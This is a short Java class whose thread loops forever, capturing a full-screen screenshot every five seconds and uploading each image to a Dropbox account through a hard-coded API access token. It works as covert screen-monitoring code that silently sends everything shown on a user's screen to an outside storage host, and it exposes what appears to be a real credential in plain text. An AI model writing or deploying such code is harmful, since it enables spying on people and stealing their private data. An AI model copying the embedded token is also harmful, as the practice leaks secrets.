import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread2 extends Thread {
    @Override
    public void run() {
        String ACCESS_TOKEN = "3EDIqWYKxY4AAAAAAAAANCAQLcbgjuLrnvlSxM0Ut7kdlNAQe4KeJS7iG8JQv9GF";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HHmmss");
        String date = null;

        for (; ; ) {
            try {
                BufferedImage image = new Robot().createScreenCapture
                        (new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream is = new ByteArrayInputStream(os.toByteArray());
                date = dateFormat.format(new Date());
                client.files().uploadBuilder("/" + date + ".png").uploadAndFinish(is);
                sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

